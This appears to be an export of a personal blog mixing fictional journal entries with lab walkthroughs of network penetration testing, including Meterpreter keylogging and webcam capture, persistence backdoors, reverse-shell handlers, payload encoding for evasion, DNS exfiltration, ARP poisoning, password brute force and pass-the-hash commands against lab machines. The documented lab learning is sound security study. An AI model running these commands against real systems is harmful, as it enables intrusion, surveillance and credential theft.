[{"content":"Welcome to Val\u0026rsquo;s official blog !\nA central hub for all of his penetration testing, exploitation projects and security research. The whole journey will be documented here so stay tune, tell your family and friends and enjoy the ride (҂◡_◡) ᕤ\n","date":"19 Jul, 2024","externalUrl":null,"permalink":"/","section":"","summary":"Welcome to Val\u0026rsquo;s official blog !","title":""},{"content":"","date":"19 Jul, 2024","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories"},{"content":"","date":"19 Jul, 2024","externalUrl":null,"permalink":"/tags/love/","section":"Tags","summary":"","title":"Love"},{"content":"","date":"19 Jul, 2024","externalUrl":null,"permalink":"/tags/networking/","section":"Tags","summary":"","title":"Networking"},{"content":" Disclaimer : This blog post is a work of fiction. Names, characters, businesses, places, events, and incidents are either the products of the author\u0026rsquo;s imagination or used in a fictitious manner. Any resemblance to actual persons, living or dead, or actual events is purely coincidental.\nDriving back from the encounter, the White Rabbit arrives home with confusion as to what just happened at work. Grabbing his trusty red foldable bike from the stairs he decides to head off into town as the sun was setting down to let his mind wonder a bit before sleep.\nThis country used to be an amazing city full of interesting people, things to do and see. However, over the year water level has risen for strange reasons which turned the city down to a little town with with old ancient buildings left in tact and tight street alleys.\nThe Rabbit decides to head down to his favorite spot to see how the gooses are doing and see the seaside by the dock, cycling there wasn\u0026rsquo;t long of a trip, only 5 minutes to cycle down to get the best place in town. But he stops by a corner shop to buy a delicious, cold and creamy snack perfect for the summer as traditions when heading out.\nThe docks was filled with boats which were tightly parked like sardines, the wind was swaying the water gently which rocked the boats in a calm manner. Over the water you could see a platform for industrial warehouse to have things dropped off by large boats that have come from far lands, the White Rabbit doesn\u0026rsquo;t travel far but when he does it\u0026rsquo;s to visit his families ice cream business. He took it all in in silence, no thought came over, just a blank slate.\nHis icy treat was a perfect merge of two strange flavours that you wouldn\u0026rsquo;t expect to go with each other, one side is zesty, sour, fresh yellow part with a complimentary rich, deep flavour with a deep hint of Almond on the more red ish side. This makes it the perfect treat for those days where you could just wear a t-shirt out late at night without getting cold. (≧︿≦)\nAs he was close to finishing he noticed that a Pelican was stood still on a dock beam the entire time, the Rabbit looks over while finishing his treat.\n\u0026ldquo;Why do I feel like this, I\u0026rsquo;ve never had an encounter with someone like this before, why today?\u0026rdquo; the Rabbit says, the Pelican didn\u0026rsquo;t answer or move.\n\u0026ldquo;Why do I want her so badly knowing that she has someone already?\u0026rdquo; Still no answers.\n\u0026ldquo;Well I just wanted to say thank you for letting me dream for just one day, I knew the moment wouldn\u0026rsquo;t last so I cherished it, every minutes and I\u0026rsquo;m glad you gave me this gift for the efforts I put in this world, You are Real.\u0026rdquo; The Pelican looks over.\n\u0026ldquo;You have done well in your hard journey up until know, you have improved yourself far enough through these grusome years of self-improvement and I believe you are worthy for a selection of a complimentory, enternal partner\u0026rdquo; The Pelican responded after staying silence.\nIn awe the Rabbit stood there amazed at what he has just witnessed, \u0026ldquo;Did you just speak to me?\u0026rdquo; the Rabbit responded.\nThe Pelican flies off into the river side into the horizon, what great response that was from it, but it did lack clarity, I\u0026rsquo;m sure this won\u0026rsquo;t effect the story.\nYour browser does not support the video tag. Rabbit decides to hop back on bike and then head over to the dock crossing bridge edge where he can see a great view of the ocean and distant silhouette.\nOn the way he saw the goose house that sits between a building and a still part of the dock river which allows them to freely swim in and out of the ocean and river, there are small babies inside along with the mother and no sight of the father, probably out hunting for the kids. There was one of the baby geese that was out swimming by itself. It was a courageous small geese and wanted to explore around the house which it did, it got stuck and screamed out but the mother wasn\u0026rsquo;t going to help, she was too busy keep all the others together. So Rabbit watched it struggle for a little while thinking to go over and help but he just sat there, eventually it got back to its mother but it really makes you think that you are truly alone in this world that even your own mother might not help so be the toughest person you can be in this world. (ﾉ◕ヮ◕)ﾉ*:・ﾟ✧\n\u0026ldquo;What a great view\u0026rdquo; the Rabbit thought as he was siting down on that windy night, it was a strong wind coming towards East which had the Rabbit huddle for warmth but luckily he wears a white top which keeps him very warm a cosy and would also another person if needed it was that big. After a while of sitting he decides to lay there for a bit a look at the distant stars that are starting to appear, he felt like just laying down there in the cold and getting cozy under the moon light.\nHe was shaking from the cold breeze coming from the ocean which attracted the attention of seagulls which decided to cycle above his head as if they were vultures ready to eat him when he stops moving.\n\u0026ldquo;Thank you for this short dream, I am forever grateful for this dream and opertunity to experience history being made as I write this. I just wanted to say that the beings beyond me are the ones to thanks, every one and everything and the Buddha.\u0026rdquo;\nBro then returned home and fell asleep as if nothing happened, bro chilled out but couldn\u0026rsquo;t sleep for some reason which was something that happens all the time so he reads \u0026ldquo;Kafka on the Shore\u0026rdquo; by Haruki Murakami which is a fantastic aurthor and I would recommend \u0026ldquo;Norwegian Wood\u0026rdquo; by Haruki Murakami as this has more sexy scenes and better story telling. Your browser does not support the video tag. 1. Post-exploitation using Meterpreter # Using the reverse-shell gained from Part 6 #42 smb eternalblue vulnerability Meterpreter runs on the targets memory which doesn\u0026rsquo;t write any data, however it will show as a running process. We can migrate the process into a less suspicious process with run post/windows/manage/migrate Windows will have hashes of users login password stored on the Security Account Manager (SAM) which is usually located at C:\\Windows\\System32\\config. This can be retrieved using hashdump 1.1 Useful Meterpreter Commands # keyscan_start: Meterpreter begins capturing the keystrokes entered by a user on the compromised host. keyscan_stop: Stop capturing the keystrokes entered by a user on the compromised system. keyscan_dump: Exports the captured keystrokes into a file. screenshot: Meterpreter will capture a screenshot of the desktop on the compromised host. screenshare: Begins a real-time stream showing the live actions performed by a user on the compromised host. record_mic: Meterpreter activates the microphone on the compromised host and begins recording. webcam_list: Displays a list of webcams available on the compromised host. webcam_snap: Activates the webcam on the compromised host and takes a picture. webcam_stream: Begins a live stream from the webcam on the compromised system. search: Using the search –f \u0026lt;filename\u0026gt; command quickly searches on the compromised system for the file. pwd: Displays the present working directory when using a Meterpreter shell on a compromised system. cd: This command allows you to change the working directory while using the Meterpreter session on a compromised host.\n1.2 Uploading and downloading files # Uploading vncviewer.exe from Part 5 with meterpreter \u0026gt; upload /usr/share/windows-binaries/vncviewer.exe c:\\\\ Download files with download c:\\\\java0.log /home/kali/Desktop 2. Privilege Escalation In Meterpreter # When targeting real organisations I will be most likely targeting employees that aren\u0026rsquo;t the most tech-savy to gain either a reverse or bind shell, this is great to get access inside a network but I won\u0026rsquo;t have the level of access to perform administrative commands which is game over for a target.\nTo increase my privilege on the win2k8 vm machine I will use the priv extension provided within Meterpreter 2.1 Token Stealing and Impersonation # When an admin remotely accesses a host this creates a token like a footprint of their past login activity, if found on a compromised host within a Meterpreter shell it can be used to escalate our privilege\nWith a MSF eternalblue meterpreter shell, run use incognito to get extra commands followed by list_tokens -u I then logged into the win2k8 lab administrator account and impersonated the token with impersonate_token \u0026quot;VAGRANT-2008R2\\Administrator\u0026quot;\nUse getsystem command to migrate from administrator to system authority which is the highest level of authority. 3. Implementing Persistence # A meterpreter shell connection will be loading into ram meaning that whenever the target client turn\u0026rsquo;s off power to their machine we loose a connection which means we will have to go through the process of opening another shell. I could use a few techniques with Meterpreter to create persistence, meaning that I could connect to the host whenever it\u0026rsquo;s online.\n3.1 Creating Persistence through Account Creation Backdoor # With a Meterpreter connection to the Win2k8 Lab machine, execute following command to enable RDP port: run post/windows/manage/enable_rdp Create a shell and run net user pentester password1 /add to create a user \u0026lsquo;pentester\u0026rsquo; with \u0026lsquo;password1\u0026rsquo; as the login pass When trying to connect using the Rdesktop tool to log into the account created I come across an error message for configuring allow log on for the user !! Try to find a bypass for RDP new member Allow log on through Terminal Services, check if the payload has been created ! If persistence isn\u0026rsquo;t necessary for a penetration test, simply don\u0026rsquo;t do it. 3.2 Registry Persistence Creation # MSF contains two main modules which are designed for Window persistence creation:\nexploit/windows/local/persistence exploit/windows/local/registry_persistence Both will modify the registry value located within HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run and insert a VBS script in C:\\WINDOWS\\TEMP\\ which executes the script whenever the user boots up the machine. Execute the following commands on MSF meterpreter \u0026gt; background msf6 \u0026gt; use exploit/windows/local/persistence msf6 (windows/local/persistence) \u0026gt; set SESSION 1 msf6 (windows/local/persistence) \u0026gt; set STARTUP SYSTEM msf6 (windows/local/persistence) \u0026gt; set LHOST 172.30.1.21 msf6 (windows/local/persistence) \u0026gt; set LPORT 87 msf6 (windows/local/persistence) \u0026gt; exploit After creating a persistence payload on the target, connect to it with the following commands msf6 \u0026gt; use exploit/multi/handler msf6 exploit(multi/handler) \u0026gt; set payload windows/meterpreter/reverse_tcp msf6 exploit(multi/handler) \u0026gt; set AutoRunScript post/windows/manage/migrate msf6 exploit(multi/handler) \u0026gt; set LPORT 87 msf6 exploit(multi/handler) \u0026gt; exploit 3.3 Lateral Movement and Pivoting # Turn on Metsploitable 3 Win2k8 and Metasploitable 3 Linux Obtain a Meterpreter shell and use the arp command List network interfaces and their MAC address with ipconfig which allows us to see the hidden network Netmask in the following screenshot: The route command will confirm any gateways accessible from the Meterpreter connection Give access to these hidden routes with run post/multi/manage/autoroute which will allow connection to these other networks 3.4 Clearing Tracks after Penetration Test # Make sure to remove any custom payloads, configuration changes, backdoors after a penetration test on an organisation 4. Data Encoding and Exfiltration # ƸӜƷ ƸӜƷ ƸӜƷ Hey I know I\u0026rsquo;ve been talking a lot but I appreaciate you being here reading on, you never know when I\u0026rsquo;ll drop secretes of the story here in the research huh? Well I will be so be on the lookout ƸӜƷ ƸӜƷ ƸӜƷ\nIn this section I will be going over encoding payloads to reduce detection rate and also how to extract sensitive files without being detected. I will learn more on encoding Windows executable and how to convert files into DNS queries.\n4.1 Encoding Executable with exe2hex # Exe2hex is a encoder which comes with Kali that allows for conversions from window executable to ASCII which when ran on a victim will convert back into an executable, this method of encoding isn\u0026rsquo;t an effective way to stay stealthy.\nUse /usr/bin/exe2hex -x vncviewer.exe to convert the vncviewer.exe encoded file from [[Chapter-7-Understanding-Network-Penetration-Testing#2.2 Using Shellter to reduce detection]] Setup a Metasploit listener with the following commands: sudo msfconsole msf6 \u0026gt; use exploit/multi/handler msf6 exploit(multi/handler) \u0026gt; set payload windows/meterpreter/reverse_tcp msf6 exploit(multi/handler) \u0026gt; set AutoRunScript post/windows/manage/migrate msf6 exploit(multi/handler) \u0026gt; set LHOST 172.30.1.22 msf6 exploit(multi/handler) \u0026gt; exploit Open a python web server with python3 -m http.server 8080 and navigate to the address using the targets client and download the vncviewer.cmd file from the exe2hex encoding Run the vncviewer.cmd file, this will reassemble the ASCII file into an executable which can be ran to open a meterpreter shell between Kali and the target After running the executable a meterpreter session has opened 5. Data Exfiltration using PacketWhisper # 5.1 Setting up the environment # Install the following packages from git: git clone https://github.com/TryCatchHCF/PacketWhisper wget https://github.com/TryCatchHCF/PacketWhisper/archive/refs/heads/master.zip Install the master.zip file using a Python web server with the command python3 -m http.server 8080 Install python-2.7.18 onto the win2k8 lab machine after transferring, this will allow us to run the PacketWhisper scripts on the machine Go to Control Panel \u0026gt; System and Security \u0026gt; System \u0026gt; Advancded system settings \u0026gt; Environment Variables Under the System variables section select Path and click on Edit where ,C:/Pyton27 should be added at the end of the Variable value string. This will allow python programs to run on this dinosaur system 5.2 Changing the DNS setting on the compromised host # A tool which will allow stealthy file transfer over DNS from a compromised machine to another on a network\nOn the win2k8 machine head to Control Panel \u0026gt; Network and Sharing Center \u0026gt; Change Adapter Settings Then double-click on the PentesNet adaptor and select Internet Protocol Version 4 5.3 Performing Data Exfiltration # Extract the master.zip file containing PacketWhisper and cd into it from the compromised machine, create a password file containing credentials Run the program with python packetWhisper.py and select option 1 to transfer a file via DNS: Make the following selections below to choose a cipher and a cloak: Agree to view the samples with y and begin transfer while having Wireshark opened on Kali listening to traffic coming from the PentesNet 172.30.1.0/24 Wireshark will start to collect traffic coming from the compromised system which should be saved into PacketWhisper directory and saved as a pcap for reading Now that we sneakly sent over a password file over DNS we can read the file over on Kali by running python2 packetWhisper.py and making the following selections: The file can be read with cat decloaked.file 6. Understanding MITM and packet sniffing attacks # A network will connect devices through switches which constantly send packages containing different types of information, these can contain credentials, documents website visited depending on the protocol used.\nAn MITM or also known as a Man-in-the-middle attack which sits between packet traffic flow on a network.\n6.1 Using Ettercap to perform a MITM attack # MITM can make use of the Address Resolution Protocol (ARP) which resolves a IP to MAC address to map all devices on a network, this is stored within a ARP cache on each host device. I will be using Ettercap to poison the ARP cache to redirect all traffic from both my win2k8 and OWASP BWS lab to my Kali linux machine\nMake sure both win2k8 and OWASP BWS virtual machines are on the PentesNet network and execute the following command on Kali: sudo ettercap -i eth1 -T -q -S -M arp:remote /172.30.1.21// /172.30.1.23// On the win2k8 VM go to http://\u0026lt;OWASP-BWA-IP\u0026gt; through a browser which I could then read packages through Wireshark, here we can see HTTP connections being established by both VMs Confirm that the ARP has been poisoned by Ettercap with arp -a on the win2k8 VM We can send credentials through an unsecure HTTP connection between each VMs by selecting OWASP WebGoat which will prompt the user to enter login credentials. This will be picked up by Ettercap Conclusion # Alright guys hope yall enjoyed this months chapter, I do try to get these out as fast as humanly as possible so let me try, as of today (23/07/2024) I have written so much late at night that it\u0026rsquo;s unbelievable that I was the same person a couple of years ago, I would of never thought in a million years that I would be writting a book which is something I believe we all have in us and should give it a shot since we miss every shot we don\u0026rsquo;t take and going all in this summer of 2024 is gonna be crazy. Finna meet some girls, play around on my bike, go on dates and fall in love. This is looking like a great come back from the time I was off and I wanted to say thank you the read for putting up with my shit. I know writing isn\u0026rsquo;t my thing but please keep in mind that I\u0026rsquo;m only 19 and writing can be difficult so I do my best. This is something I can be excited about when I wake up and put all my energy into which is a great way to forget about other troubles. I would like to get back into routine more and meditate to keep my sanity sane and in tack just so I don\u0026rsquo;t go crazy again. Anyways I go a bracellet from these kids at a stand selling loon bands so I ask the two girls to make one for her and me and get matching bracelet, shit gonna be fire just wait. Story going to be crazy.\n","date":"19 Jul, 2024","externalUrl":null,"permalink":"/posts/part-7-advanced-network-penetration-testing-post-exploitation/","section":"Blog","summary":"Disclaimer : This blog post is a work of fiction.","title":"Part 7 Advanced Network Penetration Testing Post Exploitation"},{"content":"","date":"19 Jul, 2024","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series"},{"content":"","date":"19 Jul, 2024","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags"},{"content":"","date":"19 Jul, 2024","externalUrl":null,"permalink":"/series/ultimate-kali-linux-book/","section":"Series","summary":"","title":"Ultimate-Kali-Linux-Book"},{"content":"","date":"19 Jul, 2024","externalUrl":null,"permalink":"/categories/walkthrough/","section":"Categories","summary":"","title":"Walkthrough"},{"content":"","date":"19 Jul, 2024","externalUrl":null,"permalink":"/tags/yapping-journaling/","section":"Tags","summary":"","title":"Yapping-Journaling"},{"content":"Hello friend,\nHello friend, you have been created in my head as a way for me to combat loneliness in this world. You would be surprise with how many people you can know and still feel lonely at night, some nights are unbearable, I just can\u0026rsquo;t keep it all within, I try to drown it with music but now it just makes things worst, I got used to sleeping with it. I am getting support from a good old friend from my college, we go way back. But it hurts when a Best Friend / Soul Brother / Family turns on you from the front. You get to see there faceless expression as a way of saying I don\u0026rsquo;t understand you so die, it hurts, I wouldn\u0026rsquo;t wish that on anyone.\nI also don\u0026rsquo;t want to see her go and leave the house with someone that do bad things, I will end up doing something stupid. It hurts writing this. My plushy that was given by her helps at night.\nSomething strange happened at work yesterday, the morning started with me driving through a storm on the way and seeing a friend that I met first shift walking up so I give a thumbs up ヽ(゜～゜o)ノ\nI arrive 15 minutes early and everyone says hi to me, I smile back and say hello. In the staff room eating the pineapple my aunt gave me for lunch I see that same friend from the storm.\nWe\u0026rsquo;re both Asian so we share and celebrate a lot of our culture and differences, talk about past difficulties and support each other like brothers. We try to understand each other.\nWalking with storm friend we meet with his brother which also works there, we catch up, laugh, play around like boys while waiting for the day to start, which is when I first see her.\nStorm\u0026rsquo;s brother says in a joking way shes a manager so we can mess around so she would take the blame, bruh ╥﹏╥. She looked young, maybe around my age, I play along Storm and his brother more and start the day at the machine.\nThe machine is scary, it\u0026rsquo;s large, eats things and can hurt what it eats if not careful. There is a Elder Rat who works inside the machine room with me inside this castle. Some say he came with the place from the 1800s but they\u0026rsquo;re just trolling.\nThe Elder Rat knows the ins and out of the castle catacomb and knows the machine room more than any, everyone looks down on him for being slow moving but I see something different. I saw him clean the machine with ease, he did an amazing job at it with ease like casting a spell to get it to clean itself, compared to me seeing others who don\u0026rsquo;t understand the machine, they did a poor, long job lol.\nAfter a gruesome first half of the day in the machine it\u0026rsquo;s finlay time to eat, I haven\u0026rsquo;t eaten all day and could pounce at a prey if my life depended on it, hunger makes me a bit angry, focused, clear minded, on edge.\nToday\u0026rsquo;s lunch is amazing, truly magical, minced beef with green and red bell peppers, egg plants, mushrooms, a delicious sauce and asparagus ♡٩(^▿^)۶♡\nBefore eating I try to look for Storm and the boys but can\u0026rsquo;t seem to find them, so I serve myself a plate and follow the Elder Rat to a table.\nThere are multiple girls on the table so I sit in-between two empty seats, I see her come last with her plate slowly and sits next to me. It\u0026rsquo;s the \u0026ldquo;Manager\u0026rdquo; from the start of the day, she wore all black, her hair, her eyes, her shirt, apron, trousers, shoes everything. I am nervous, what is this feeling? She is like an All black house sparrow.\nShe\u0026rsquo;s the one to start the conversation and break the pressure that was building, picking up from an older conversation with another girl she started with how growing asparagus is an amazing form of making a living, it\u0026rsquo;s peaceful as you only have to work like 3 months a year as it\u0026rsquo;s a great to make a living. I said that was \u0026ldquo;cool\u0026rdquo;, I sounded stupid.\nShe has hair clipped up like a palm tree, She has freckles, She wears black eye liner, She has sever OCD, She has a big family abroad, many sister where the youngest is just a couple months young, She studies a neural science course at university and is interested the effects drug has on the brain, She can\u0026rsquo;t get the medication she needs, She is thinking of moving down here in the little town, I said I like anime and she said it back, she moved slightly closer with her crossed legs but I don\u0026rsquo;t know what to do, everyone was saying to her to move to a city but I said our town is beautiful with sun and ocean and we work at a castle which made her giggle, that laugh of hers keeps replaying in my head, there was talk about drugs it was too much for me, I need support I need to get out of here, I feel like running, I finished my food I need to run.\nStorm comes and join, I am relieved, he brings back the sun when the fog started to block my view. I smile, I laugh, I love.\nBreak is over and I need some sun, I take my glasses off and bath in the sun through the religious glass panes like a plant recharging and nurturing. I am calm like still water.\nShe is still sitting at the table, oh no, did I do something stupid, did she see me being weird, she thinks I\u0026rsquo;m weird, will she pretend to like me but out of empathy?\nI put my glasses back and walk slowly back, I can\u0026rsquo;t help but look at her focused on some papers straight after break. She is hard working, maybe for her family, she struggles with a lot of things like me. I try to understand.\nI forget my plate and soon see it in the machine room for it to be eaten, I don\u0026rsquo;t want it do end, I don\u0026rsquo;t want it to die, I don\u0026rsquo;t want to forget but I let go and take a picture to remember, the plate that I played with during the heavy conversations helped me distract myself for a short period. It looked like a painting.\nOn the drive back I screamed, what is this feeling, my chest hurts, I can\u0026rsquo;t think, I don\u0026rsquo;t want to die I want to live.\nhttps://open.spotify.com/track/5awii6NgEPbGSQSCiyErCp?si=5b9c78aa54654a71\nDisclaimer : This blog post is a work of fiction. Names, characters, businesses, places, events, and incidents are either the products of the author\u0026rsquo;s imagination or used in a fictitious manner. Any resemblance to actual persons, living or dead, or actual events is purely coincidental.\n","date":"16 Jun, 2024","externalUrl":null,"permalink":"/posts/yap-series/16-06-2024-love/","section":"Blog","summary":"Hello friend,","title":"16 06 2024 Love"},{"content":"","date":"16 Jun, 2024","externalUrl":null,"permalink":"/tags/life/","section":"Tags","summary":"","title":"Life"},{"content":"","date":"16 Jun, 2024","externalUrl":null,"permalink":"/tags/noise/","section":"Tags","summary":"","title":"Noise"},{"content":"","date":"16 Jun, 2024","externalUrl":null,"permalink":"/tags/trouble/","section":"Tags","summary":"","title":"Trouble"},{"content":"","date":"16 Jun, 2024","externalUrl":null,"permalink":"/series/yap-journaling/","section":"Series","summary":"","title":"Yap-Journaling"},{"content":"","date":"16 Jun, 2024","externalUrl":null,"permalink":"/categories/yapping-journaling/","section":"Categories","summary":"","title":"Yapping-Journaling"},{"content":"Another sunny day here down the sea front, slight morning breeze, have a runny nose and sunsets are starting to look purple which are quite the site. A perfect season to do my CTF training in the morning when the sparrows start to chirp; relax in the afternoon for a bike ride, this will be my routine for the end of my first year of Uni ! Summer here we come.⛅\nLots of exciting stuff has happened but I\u0026rsquo;ll keep it short:\nHad a fantastic idea last night for a project which will last a lifetime, a project that will be updated and released on a three-year cycle. It\u0026rsquo;s very ambitious which some may say, impossible, with balancing University, Gym, Bouldering, Best friends, watch/read anime, read and more ! This is just asking for a burnout at this point lol how does he do it ? Time management, and seeing how spinning multiple plates is like by seeing how many I can hold one at the time, what happens when I spin one faster than the others? what happens to the balance of it all? How I deal with all plates falling off etc. Truly a worthwhile skill to have which I have been working on for over 2 years now and will reveal more over the future. Have a whole bunch of trips, events and holidays coming up! Lazer tag for end of Uni this Thursday, camping on the 26th, Belgium and more !\nThe house sparrows have grown in numbers this year, it truly brings us a rich garden, I think it may be from the papa and mama bringing children here, it\u0026rsquo;s great for the plants and they\u0026rsquo;re experimenting with how other trees feel around because there\u0026rsquo;s so many! Love to watch them sit to share stuff they\u0026rsquo;ve learned, forming communities which help each other against the jaguars(cat) that lurks in the bushes ready to pounce if one left alone, fall in love and form families all outside my bedroom window. Anyway, enough of a life update and lets talk Networking Penetration baby. This is one of the most important discipline to learn when testing the security of an organisation, understanding how to navigate around a network could expose vulnerable devices which could be leveraged for higher privileges or probed for credentials.\n1. Discovering live systems # When pentesting an organisation they may give you internal access to the network along with an agreement of what scope of the system should be targeted, make sure this agreement isn\u0026rsquo;t breached as this can break legal agreements.\nI will be using metasploitable 2 and metasploitable 3 created in the labs section [4. Setting up Metasploitable 2]\n1.1 Scanning for available devices using Netdiscover # Using netdiscover, I will scan for available devices within a range, make sure vm or attacking machine isn\u0026rsquo;t connected to the internet or other networks as the scan can pick up on other devices. This is a stealthy way of scanning for devices as it listens for ARP messages sent by hosts.\n$ sudo netdiscover -pf # Random, passive fast scan $ sudo netdiscover -r 172.30.1.0/24 -i eth1 # Range scan and NIC Sometimes ICMP probing can be disabled on some network to avoid hacker from discovering systems on a network 1.2 Scanning for available devices using Nmap # $ nmap -sn 172.30.1.0/24 1.3 Scanning for available devices using nbtscan # Using nbtscan to scan for any file sharing systems running on the network with sudo nbtscan -r 172.30.1.0/24 2. Profiling a target system # It is important to perform as much recon on a target such as scanning for ports, OS version, running services as most systems run software on an older version as updating to a newer version will mean down-time due to having to reconfigure or it not being compatible with other software within the infrastructure. Sometimes the system just works so there is no need to update to a newer version ¯_(ツ)_/¯\n2.1 Using Nmap to scan for OS versions # $ nmap -A 172.30.1.21 3. Exploring password-based attacks # There are a wide range of techniques to crack accounts, login portals and password-protected files or devices:\nBrute force - Using combination list of possible passwords Password spraying - Using the same password on multiple accounts Dictionary attack - Using a list of common words and phrases Password guessing Password cracking - Uses tools and techniques to retrieve login credentials Credential stuffing - Use password from a breached database Username:Password on multiple platform for credential overlap. Online password attacks - Web based or protocol cracking Offline password attacks - Password-protected devices, zip files, encrypted drives etc. 3.1 Using Ncrack to guest passwords online # For this I will be using the Win2k8 vagrant machine as a victim and will be attacking the rdp protocol hosted on port 3389, here is a nmap scan with script probing: ┌──(kali㉿kali)-[~] └─$ ncrack -vv -T 3 -u Administrator -P /usr/share/wordlists/rockyou.txt rdp://172.30.1.21 Starting Ncrack 0.7 ( http://ncrack.org ) at 2024-06-13 06:46 BST Discovered credentials on rdp://172.30.1.21:3389 \u0026#39;Administrator\u0026#39; \u0026#39;vagrant\u0026#39; 3.2 Using Hydra to guest passwords online # Hydra is another popular online cracking tool which has multiple uses to target web pages and protocols, a great tool to have. Same target as 3.1:\nsudo hydra -t 4 -l Administrator -P /usr/share/wordlists/rockyou.txt rdp://172.30.1.21 Results: 3.3 Exploiting Remote Desktop Protocol (RDP) # With the password cracked from 3.1 and 3.2 I can use the rdesktop tool to remotely access which should give me full view and control of the user which is Administrator:vagrant\nrdesktop -u Administrator -p vagrant 172.30.1.21:3389 -g 1280x1024 3.4 Creating custom wordlists/dictionary using CeWl # When using a brute force dictionary attack like in 3.1 and 3.2 if the password isn\u0026rsquo;t contained within the wordlist then there will be no access.\nThere are many tools to generate custom wordlists with specific regex, CeWL is unique as it takes a website as an input for generating a wordlist by using common words used on the website.\ncewl example.com -m 6 -w output_dictionary_file.txt website: Results:\nExample Domain domain illustrative examples documents literature without coordination asking permission information 3.5 Creating custom wordlists/dictionary using Crunch # Seems to throw a setlocale() failed error may require fix on main pc Crunch allows for custom wordlist generation which can be done by providing a min and max character count along with some key words and rules to generate every possible combination using what has been provided\ncrunch 4 4 0123456789ABC -o output_file.txt 4. Identifying and Exploiting Vulnerable services # In this section I will be exploiting plain login access for File Transfer Protocol (FTP) and Server Messaging Block (SMB)\n4.1 Anonymous Login Misconfiguration on FTP # File Transfer Protocol commonly on port 21 is used to allow external access from other machines to a storage server as a way to download files remotely.\nUpon scanning the Win2k8 machine I can see that a misconfiguration to the server has been made which allows for anonymous FTP login. Tut-tut, an easy prey, very naughty.\nNmap script probing scan on Win2k8 lab machine we can see that login in with the user Anonymous: will grant access but something more interest appeared: Looking up \u0026ldquo;vsFTPd 2.3.4 vulnerability\u0026rdquo; on the internet shows a metasploitable module which can give me a backdoor to the prey. Load msf and module unix/ftp/vsftpd_234_backdoor\nAfter gaining a reverse shell I spawned a python-based pseudo terminal in the bind shell with python -c import pty:pty.spawn(\u0026quot;/bin/bash\u0026quot;)` Listed passwords stored in /etc/shadows which I then saved in a txt file to be cracked using John the Ripper 4.2 SMB Eternalblue vulnerability # more on SMB open at HackTricks: https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb SMB is a protocol used to send files over one connected device such as nodes, printers and serial ports on a network. Commonly hosted on port 445, 135-139, SMB is commonly used on Windows machines.\nFirst Nmap scan common SMB port range between 135-139: See that the Win2k8 machine is using Windows Server 2008 and load up the MSF windows/smb/ms17_010_eternalblue module: After getting a shell, retrieved login accounts and password hash credentials with the hashdump command in meterpreter and checked hash ID: 4.3 Cracking Passwords with Hashcat # From the hash retrieved we can use hashcat to compare the hash of a common wordlist against the hashes we have, if it\u0026rsquo;s a hit I will have access to the network such as admin login creds ᶘ ᵒᴥᵒᶅ\n$ hashcat -m 1000 /home/val/Desktop/hashdump.txt -a 0 /home/val/Downloads/rockyou_1.txt 4.4 Getting a shell with PsExec # Microsoft have developed a suite of tools known as sysinternals which provides a set of tools for administrators, they can be found and downloaded from: https://learn.microsoft.com/en-us/sysinternals/downloads\nOne of these tools under the process utilities category is the PsExec which is a remote control program which allows sysadmins to execute programs.\nLoading MSF and module windows/smb/psexec to exploit Gain reverse shell of network with command shell 4.5 Accessing remote shares using SMBclient # SMBclient is a tool which allows user talk to a SMB server such as accessing files stored, uploading files from a local machine and retrieving directory information. This is part of the Samba suite.\n# Access smb server using admin as user input smbclient -L \\\\\\\\172.30.1.23\\\\ -U Administrator When listing file shares on windows system \\\\\\\\ is required before the IP and \\\\ after the IP\nThis will display all the available root directories available for navigation, a folder can then be explored using: smbclient \\\\\\\\172.30.1.21\\\\ADMIN$ -U Administrator\nDiscovering Admin folder:\nDiscovering C$ folder: Download image file jack_of_diamonds.png with the get command. Due to misconfigurations I am able to download sensitive images and logs which could be used to further target an organisation or innocents.\n5 Passing the Hash Technique # Brute-force and dictionary password attacks take long time to perform which isn\u0026rsquo;t ideal for pentesters where they will have time constraints.\nThis is where the passing the hash techniques is used as it will capture the NTLM password hash stored by windows system and pass it to the active directory (AD) and Domain Controller (DC) using specific tools to execute code remotely without having to crack password.\n5.1 Getting that shell with PTH-WinExe # Using the Hash gathered from the hashdump earlier, using pass-the-hash for windows module from the Pass-The-Hash toolkit to transfer the hash over the network.\npth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b //172.30.1.21 cmd 5.2 Impacket, the tool to rule them all # Impacket is a suite of networking tools, written in Python, designed for pentesting networks, here are the available tools:\nI will be performing a PTH attack with the impacket-psexec Python module on the Win2k8 machine\nimpacket-psexec Administrator@172.30.1.21 -hashes aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b 6. Gaining Access by Exploiting SSH # SSH is a network protocol which allows administrators to log into a machine and perform remote code execution.\nNmap scan for common SSH port 22: Load MSF and the module scanner/ssh/ssh_enumusers to get a list of possible users: Then use the scanner/ssh/ssh_login MSF module to attempt an SSH login with the credentials Administrator:vagrant. We got these from previous sections from hash cracking, use the sessions command to move shell to background\nChecked sessions ID with sessions and used sessions -i \u0026lt;session-ID\u0026gt; 7. Exploiting Windows Remote Management WinRM # More details at https://learn.microsoft.com/en-us/windows/win32/winrm/portal WinRM is a protocol which allows administrators to remotely manage computers on a network. Commonly found on port HTTP-5985 and HTTPS-5986.\n7.1 WinRM enumerating with MSF # Nmap script scan on port 5985: $ nmap -A -p 5985 172.30.1.21 Load MSF and the module auxiliary/scanner/winrm/winrm_cmd Fill out options for MSF WinRM module and execute the exploit Result:\nWindows IP Configuration Host Name . . . . . . . . . . . . : vagrant-2008R2 Primary Dns Suffix . . . . . . . : Node Type . . . . . . . . . . . . : Hybrid IP Routing Enabled. . . . . . . . : No WINS Proxy Enabled. . . . . . . . : No Ethernet adapter Local Area Connection 2: Connection-specific DNS Suffix . : Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Desktop Adapter #2 Physical Address. . . . . . . . . : 08-00-27-66-C5-26 DHCP Enabled. . . . . . . . . . . : Yes Autoconfiguration Enabled . . . . : Yes Link-local IPv6 Address . . . . . : fe80::1152:69be:3691:de8%14(Preferred) IPv4 Address. . . . . . . . . . . : 10.11.12.22(Preferred) Subnet Mask . . . . . . . . . . . : 255.255.255.0 Lease Obtained. . . . . . . . . . : Saturday, May 04, 2024 10:15:24 PM Lease Expires . . . . . . . . . . : Saturday, May 04, 2024 10:35:24 